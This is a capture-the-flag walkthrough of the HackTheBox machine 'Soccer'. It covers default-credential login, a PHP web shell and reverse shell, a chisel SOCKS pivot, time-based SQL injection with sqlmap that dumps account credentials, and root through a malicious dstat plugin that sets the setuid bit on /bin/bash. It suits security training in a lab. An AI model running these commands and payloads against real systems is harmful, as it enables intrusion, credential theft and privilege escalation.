Today We Are Going To Play With HackTheBox Soccer.

Nmap scan

Port 22,80 and 9091 are open.

Homepage

It's a simple webpage .

wfuzz

It reveal tiny directory .

Looking at tiny dir

It's running Tiny File Manager .

Trying to login

Found deafult creds.

Uploading Shell

Here we can upload php shell to tiny/uploads .

WebShell

Now we can execute command as www-data .

Reverse Shell

While listen on ippsec's favorite port i got a reverse shell .

Chisel

		

./chisel server -p 9000 --reverse      
./chisel client 10.10.14.:9000 R:socks
echo "socks5  127.0.0.1 1080" >> /etc/proxychains4.conf

I use chisel to setup a socks5 proxy and access port 3000 on soccer's localhost.

Login

After creating account and login it redirect to /check .

/check

Inspecting html source code found that this page is using websocket to check ticket.

Trailing suspect (checking for sql injection with middleware.py)

		
ws_server = "ws://soc-player.soccer.htb:9091"
 
data = '{"id":"%s"}' % message

I did above modification to python script from This website to work with port 3000, also added soc-player.soccer.htb subdomain from /etc/nginx/sites-available/soc-player to hosts file .

Trailing suspect (sqlmap)

		
sqlmap -u http://localhost:8081/?id=1 -p id --batch

I run sqlmap against id parameter found that this id parameter is vulnerable to sql time base blind injection .

Dumping databases (sqlmap)

		
sqlmap -u http://localhost:8081/?id=1 -p id --dbs --batch

Found soccer_db database .

Dumping username,password from soccer_db.accounts (sqlmap)

		
sqlmap -u http://localhost:8081/?id=1 -p id -D soccer_db --tables --batch
sqlmap -u http://localhost:8081/?id=1 -p id -D soccer_db -T accounts --columns  --batch
sqlmap -u http://localhost:8081/?id=1 -p id -D soccer_db -T accounts -C username,password --dump  --batch

After dumping tables and columns found some creds .

ssh player (user)

Creds from accounts table which is work with ssh .

Running enum.sh

Found doas binary under setuid .

Trying to execute command as root

Let's dig in, from doas.conf file found that we can run /usr/bin/dstat as root .

Trailing suspect Again (who are you dstat?)

After messing around some time found that we can load plugins from /usr/local/share/dstat/ directory which is writable, dstat plugin load uses wildcard so we can use any name for our plugin, dstat_"anything".py .

Say hello to setuid (root)

		
import os
os.system('chmod +s /bin/bash')
		
		
		
		
/usr/local/bin/doas -u root  /usr/bin/dstat --pwn

Added above python script to /usr/local/share/dstat/dstat_pwn.py that will change setuid bit of bash, now we can execute our malicious plugin as root .
